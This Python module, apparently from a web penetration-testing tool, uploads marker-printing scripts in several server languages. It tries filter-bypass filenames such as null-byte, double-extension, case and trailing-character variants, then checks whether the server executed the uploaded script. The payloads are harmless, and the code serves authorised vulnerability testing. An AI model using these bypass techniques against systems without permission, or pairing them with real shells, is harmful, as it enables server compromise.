"""
Script Execution Test – uploads files with executable payloads using various
filename bypass techniques and checks whether the server interprets (executes)
the uploaded script rather than serving it as plain text.

For each language the module embeds a small payload that prints a known marker.
After uploading, it fetches the file from storage and checks whether the marker
appears in the response WITHOUT the surrounding source-code tags — proving
the server executed the script.

Bypass techniques tested:
- Direct extension (.php, .phtml, .phar, …)
- Case variations (.PHP, .Php, .pHP)
- Double extension – dangerous first (.php.jpg) and safe first (.jpg.php)
- Null-byte injection (.php%00.jpg)
- Trailing dot / semicolon / space (.php., .php;.jpg, .php\\x20)

Contains:
- Exec class for performing the script execution test.
- run() function as an entry point for running the test.

Usage:
    run(args, ptjsonlib, http_client, print_lock)
"""

from ptlibs.ptprinthelper import out_if

__TESTLABEL__ = "Script Execution Test:"

EXEC_MARKER = "PTUPLOADER_EXEC_OK"

# ---------------------------------------------------------------------------
# Language payloads — small scripts that output EXEC_MARKER
# ---------------------------------------------------------------------------

PAYLOADS = {
    "PHP": {
        "code": f'<?php echo "{EXEC_MARKER}"; ?>',
        "source_tag": "<?php",
        "extensions": [
            "php", "php3", "php4", "php5", "php7", "php8",
            "phtml", "phar", "pht", "phpt", "inc",
        ],
    },
    "ASP": {
        "code": f'<% Response.Write("{EXEC_MARKER}") %>',
        "source_tag": "<%",
        "extensions": [
            "asp", "aspx", "asa", "cer", "cdx",
        ],
    },
    "JSP": {
        "code": f'<%= "{EXEC_MARKER}" %>',
        "source_tag": "<%=",
        "extensions": [
            "jsp", "jspx", "jspf", "jsw", "jsv",
        ],
    },
    "PY": {
        "code": f'print("{EXEC_MARKER}")',
        "source_tag": "print(",
        "extensions": ["py", "pyw", "wsgi", "cgi"],
    },
    "JS": {
        "code": f'console.log("{EXEC_MARKER}")',
        "source_tag": "console.log(",
        "extensions": ["js", "mjs", "cjs"],
    },
    "CGI": {
        "code": f'#!/usr/bin/perl\nprint "Content-Type: text/html\\n\\n{EXEC_MARKER}";',
        "source_tag": "#!/usr/bin/perl",
        "extensions": ["cgi", "pl"],
    },
}

DEFAULT_LANGUAGE = "PHP"


def _generate_bypass_variants(stem: str, ext: str) -> list:
    """
    Generates filter-bypass filename variants for a given extension.
    Returns list of (filename, bypass_description) tuples.
    """
    variants = []

    # Case variations
    if ext.isalpha() and len(ext) >= 2:
        upper = ext.upper()
        mixed = ext[0].upper() + ext[1:].lower()
        reverse_mixed = ext[0].lower() + ext[1:].upper()
        for case_var in dict.fromkeys([upper, mixed, reverse_mixed]):
            if case_var != ext:
                variants.append((f"{stem}.{case_var}", f"case: .{case_var}"))

    # Double extension (dangerous ext first, safe ext last)
    for safe_ext in ("jpg", "png", "txt"):
        variants.append((f"{stem}.{ext}.{safe_ext}", f"double: .{ext}.{safe_ext}"))

    # Reverse double extension (safe first, dangerous last)
    variants.append((f"{stem}.jpg.{ext}", f"reverse: .jpg.{ext}"))

    # Null byte
    variants.append((f"{stem}.{ext}%00.jpg", f"null byte: .{ext}%00.jpg"))

    # Trailing dot
    variants.append((f"{stem}.{ext}.", f"trailing dot: .{ext}."))

    # Trailing semicolon
    variants.append((f"{stem}.{ext};.jpg", f"semicolon: .{ext};.jpg"))

    # Trailing space
    variants.append((f"{stem}.{ext} ", f"trailing space: .{ext} "))

    return variants


class Exec:
    def __init__(self, args: object, ptjsonlib: object, http_client: object, print_lock: object) -> None:
        self.args        = args
        self.ptjsonlib   = ptjsonlib
        self.http_client = http_client
        self.print_lock  = print_lock
        self.param       = args.parameter or "file"

    def _get_language(self) -> str:
        lang = getattr(self.args, "language", None)
        if lang and lang in PAYLOADS:
            return lang
        return DEFAULT_LANGUAGE

    def _get_payload(self) -> dict:
        return PAYLOADS[self._get_language()]

    def _get_extensions(self) -> list:
        if self.args.extensions:
            return list(self.args.extensions)
        return list(self._get_payload()["extensions"])

    def _get_stem(self) -> str:
        base = self.args.file or "test.txt"
        stem, _, _ = base.rpartition(".")
        return stem or base

    def _upload_accepted(self, response) -> bool:
        if response is None:
            return False
        text = response.text
        if self.args.string_yes and self.args.string_yes not in text:
            return False
        if self.args.string_no and self.args.string_no in text:
            return False
        return True

    def _upload_file(self, filename: str, payload_code: str) -> bool:
        content_type = getattr(self.args, "content_type", None) or "application/octet-stream"
        files = {self.param: (filename, payload_code.encode(), content_type)}
        data = dict(item.split("=", 1) for item in self.args.data.split("&")) if self.args.data else None

        response = self.http_client.send_request(
            url=self.args.url,
            method="POST",
            files=files,
            data=data,
        )
        return self._upload_accepted(response)

    def _check_execution(self, filename: str, source_tag: str) -> str:
        """
        Fetches uploaded file from storage and determines execution status.

        Returns:
            "executed"   – marker found, source tag absent → server ran the script
            "source"     – marker found WITH source tag → served as plain text
            "not_found"  – file not accessible (404, None, etc.)
        """
        if not self.args.storage:
            return "not_found"

        url = self.args.storage.rstrip("/") + "/" + filename
        response = self.http_client.send_request(url=url, method="GET", allow_redirects=True)

        if response is None or response.status_code != 200:
            return "not_found"

        body = response.text
        if EXEC_MARKER in body:
            if source_tag not in body:
                return "executed"
            return "source"
        return "not_found"

    def _test_variant(self, filename: str, desc: str, payload: dict) -> dict:
        """
        Uploads a single filename variant and checks execution.
        Returns result dict: {filename, desc, accepted, execution, url}
        """
        try:
            accepted = self._upload_file(filename, payload["code"])
        except Exception:
            return {"filename": filename, "desc": desc, "accepted": False, "execution": None, "error": True}

        if not accepted:
            return {"filename": filename, "desc": desc, "accepted": False, "execution": None, "error": False}

        execution = self._check_execution(filename, payload["source_tag"])
        url = self.args.storage.rstrip("/") + "/" + filename if self.args.storage else None
        return {"filename": filename, "desc": desc, "accepted": True, "execution": execution, "url": url, "error": False}

    def _report_result(self, result: dict) -> None:
        fname = result["filename"]
        desc = result["desc"]

        if result.get("error"):
            self.print_lock.add_string_to_output(
                out_if(f"Error  [{fname}]  ({desc})", "WARNING", not self.args.json, indent=4)
            )
            return

        if not result["accepted"]:
            self.print_lock.add_string_to_output(
                out_if(f"Rejected  [{fname}]  ({desc})", "OK", not self.args.json, indent=4)
            )
            return

        execution = result["execution"]

        if execution == "executed":
            self.print_lock.add_string_to_output(
                out_if(f"EXECUTED  [{fname}]  ({desc})", "VULN", not self.args.json, indent=4)
            )
            if result.get("url"):
                self.print_lock.add_string_to_output(
                    out_if(result["url"], "TEXT", not self.args.json, indent=8)
                )
            self.ptjsonlib.add_vulnerability("PTV-WEB-UPLOAD-EXEC")
        elif execution == "source":
            self.print_lock.add_string_to_output(
                out_if(f"Accepted (served as source, not executed)  [{fname}]  ({desc})", "WARNING", not self.args.json, indent=4)
            )
        else:
            self.print_lock.add_string_to_output(
                out_if(f"Accepted but not accessible  [{fname}]  ({desc})", "WARNING", not self.args.json, indent=4)
            )

    def run(self) -> None:
        self.print_lock.add_string_to_output(
            out_if(__TESTLABEL__, "INFO", not self.args.json)
        )

        language = self._get_language()
        payload = self._get_payload()
        extensions = self._get_extensions()
        stem = f"{self._get_stem()}_exec"

        self.print_lock.add_string_to_output(
            out_if(f"Language: {language}  |  Testing {len(extensions)} extensions with bypass variants...",
                   "INFO", not self.args.json, indent=4)
        )

        executed_count = 0

        # Phase 1: direct extensions
        rejected_exts = []
        for ext in extensions:
            filename = f"{stem}.{ext}"
            result = self._test_variant(filename, f"direct: .{ext}", payload)
            self._report_result(result)
            if result["execution"] == "executed":
                executed_count += 1
            if not result["accepted"]:
                rejected_exts.append(ext)

        # Phase 2: bypass variants only for rejected extensions
        if rejected_exts:
            self.print_lock.add_string_to_output(
                out_if(f"Bypass attempts for {len(rejected_exts)} rejected extensions...",
                       "INFO", not self.args.json, indent=4)
            )
            for ext in rejected_exts:
                variants = _generate_bypass_variants(stem, ext)
                for filename, desc in variants:
                    result = self._test_variant(filename, desc, payload)
                    self._report_result(result)
                    if result["execution"] == "executed":
                        executed_count += 1

        # Summary
        if executed_count > 0:
            self.print_lock.add_string_to_output(
                out_if(f"CRITICAL: {executed_count} variant(s) resulted in server-side code execution!",
                       "VULN", not self.args.json, indent=4)
            )
        else:
            self.print_lock.add_string_to_output(
                out_if("No server-side code execution detected", "OK", not self.args.json, indent=4)
            )


def run(args, ptjsonlib, http_client, print_lock):
    """Entry point for running the Script Execution Test module."""
    Exec(args, ptjsonlib, http_client, print_lock).run()
